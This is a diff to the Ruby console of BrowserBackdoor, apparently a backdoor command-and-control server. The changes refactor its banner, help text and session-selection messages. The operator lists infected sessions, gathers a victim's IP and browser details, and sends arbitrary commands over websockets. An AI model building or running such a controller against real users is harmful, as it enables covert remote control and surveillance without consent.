@@ -32,21 +32,24 @@ require 'em-websocket'
 require 'yaml'
 
 # TODO: Make all the variables besides $wsList non global.
-$welcome_message = "
- ____                                  ____             _       _                  
-|  _ \                                |  _ \           | |     | |                 
-| |_) |_ __ _____      _____  ___ _ __| |_) | __ _  ___| | ____| | ___   ___  _ __ 
-|  _ <| '__/ _ \ \ /\ / / __|/ _ \ '__|  _ < / _' |/ __| |/ / _' |/ _ \ / _ \| '__|
-| |_) | | | (_) \ V  V /\__ \  __/ |  | |_) | (_| | (__|   < (_| | (_) | (_) | |   
-|____/|_|  \___/ \_/\_/ |___/\___|_|  |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_| by IMcPwn
-Visit http://imcpwn.com for more information.
-"
+
 $wsList = Array.new
 $selected = -1
 $CONFIG = YAML.load_file("config.yml")
-
 def main()
     Thread.new{startEM()}
+    cmdLine()
+end
+
+def cmdLine()
+    $welcome_message = ""\
+    " ____                                  ____             _       _                  \n"\
+    "|  _ \                                |  _ \           | |     | |                 \n"\
+    "| |_) |_ __ _____      _____  ___ _ __| |_) | __ _  ___| | ____| | ___   ___  _ __ \n"\
+    "|  _ <| '__/ _ \ \ /\ / / __|/ _ \ '__|  _ < / _' |/ __| |/ / _' |/ _ \ / _ \| '__|\n"\
+    "| |_) | | | (_) \ V  V /\__ \  __/ |  | |_) | (_| | (__|   < (_| | (_) | (_) | |   \n"\
+    "|____/|_|  \___/ \_/\_/ |___/\___|_|  |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_| by IMcPwn\n"\
+    "Visit http://imcpwn.com for more information.\n"
     puts $welcome_message
     print "Enter help for help."
     while true
@@ -54,8 +57,9 @@ def main()
         cmdIn = gets.chomp.split()
         case cmdIn[0]
         when "help"
-            # TODO: Shorten this line
-            puts "Commands: help -> this message\nexit -> quit the application and close all sessions\nsessions -> list active sessions\nuse -> select a session\ninfo -> get various info (ip, browser info) on selected session\nexec -> execute a command on selected session"
+            puts "Commands\n\nhelp -> this message\nexit -> quit the application and close all sessions\nsessions -> list active sessions\n"\
+            "use -> select a session\ninfo -> get various info (ip, browser info) on selected session\n"\
+            "exec -> execute a command on selected session"\
         when "exit"
             break
         when "sessions"
@@ -80,8 +84,8 @@ def main()
             $selected = selectIn
             puts "Selected session is now " + $selected.to_s + "."
         when "info"
-            if $selected == -1
-                puts "No session selected. Try use first."
+            if $selected == -1 # || TODO: Check if session no longer exists
+                puts "No session selected. Try use SESSION_ID first."
                 next
             end
             # TODO: Improve method of getting IP address
@@ -90,8 +94,8 @@ def main()
                 sendCommand(cmd, $wsList[$selected])
             }
         when "exec"
-            if $selected == -1
-                puts "No session selected. Try use first."
+            if $selected == -1 # || TODO: Check if session no longer exists
+                puts "No session selected. Try use SESSION_ID first."
                 next
             end
             if cmdIn.length < 2
@@ -106,14 +110,18 @@ def main()
                 # TODO: Support space
                 sendCommand(cmdIn[1], $wsList[$selected])
             end
-        else
-            puts "Invalid command"
+       else
+           puts "Invalid command. Try help for help."
         end
     end
 end
 
+# TODO: Make this method
+def checkSelected()
+end
+
 def sendCommand(cmd, ws)
-  ws.send(cmd)
+    ws.send(cmd)
 end
 
 def startEM()
